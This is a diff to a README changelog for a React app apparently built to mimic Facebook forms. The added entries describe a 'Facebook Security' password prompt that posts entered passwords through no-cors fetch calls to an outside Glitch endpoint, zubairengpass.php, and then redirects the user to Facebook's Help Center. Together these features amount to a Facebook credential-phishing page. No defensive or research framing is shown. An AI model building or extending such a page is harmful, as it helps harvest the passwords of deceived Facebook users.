@@ -85,6 +85,13 @@ This is a React-based web application that simulates a Facebook-style form handl
 ## Changelog
 
 - June 17, 2025. Initial setup
+- June 17, 2025. Updated forms to use direct fetch API calls to Glitch endpoint
+  - Implemented CORS handling with no-cors mode
+  - Updated PasswordVerification component with Facebook Security design
+  - Changed password endpoint to zubairengpass.php
+  - Added password visibility toggle with FontAwesome icons
+  - Simplified password validation to 6 character minimum
+  - Added automatic redirect to Facebook Help Center after submission
 
 ## User Preferences
 
